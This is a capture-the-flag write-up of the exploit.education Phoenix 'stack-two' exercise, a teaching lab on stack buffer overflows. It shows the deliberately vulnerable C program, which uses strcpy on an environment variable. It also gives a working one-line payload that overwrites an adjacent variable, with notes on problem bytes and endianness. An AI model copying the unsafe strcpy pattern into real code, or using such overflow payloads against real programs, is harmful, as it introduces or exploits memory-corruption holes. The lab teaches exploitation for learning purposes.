# Stack Two

## Code

```c
/*
 * phoenix/stack-two, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x0d0a090a
 *
 * If you're Russian to get to the bath room, and you are Finnish when you get
 * out, what are you when you are in the bath room?
 *
 * European!
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  char *ptr;

  printf("%s\n", BANNER);

  ptr = getenv("ExploitEducation");
  if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, ptr);

  if (locals.changeme == 0x0d0a090a) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
        locals.changeme);
  }

  exit(0);
}
```

## Payload
```bash
$ export ExploitEducation=$(python3 -c "print('A' * 64 + '\x0a\x09\x0a\x0d')")
$ ./stack-two
```

## Solution

- This one is a bit more interesting. Now the code is looking for an environment variable `ExploitEducation` to be set. If it is, the value store in this environment variable is copied into `local.buffer` using the unsafe `strcpy()`. 

- Just like in `stack_one` there is a sentinel value `0x0d0a090a` that we need to place into `local.changeme`. Some things to note, the values `0x0a` and `0x0d` are newline (`\n`) and carriage return (`\r`) characters respectively. This can cause problems with some C functions that will stop reading/writing when a newline is encountered. Other problem characters such as null byes (`0x00`) cause a lot of issues as well for the same reasons. We should be ok for this challenge as `strcpy()` does not care about newlines in the data it is copying, only null bytes.

- Let's set our environment variable `ExploitEducation` to our payload that we used in the last challenge. Be careful to keep in mind endianess when setting your sentinel value.

![](Pasted%20image%2020210330152809.png)

- Success! The only difference between this challenge and the previous is the use of an environment variable to set your payload.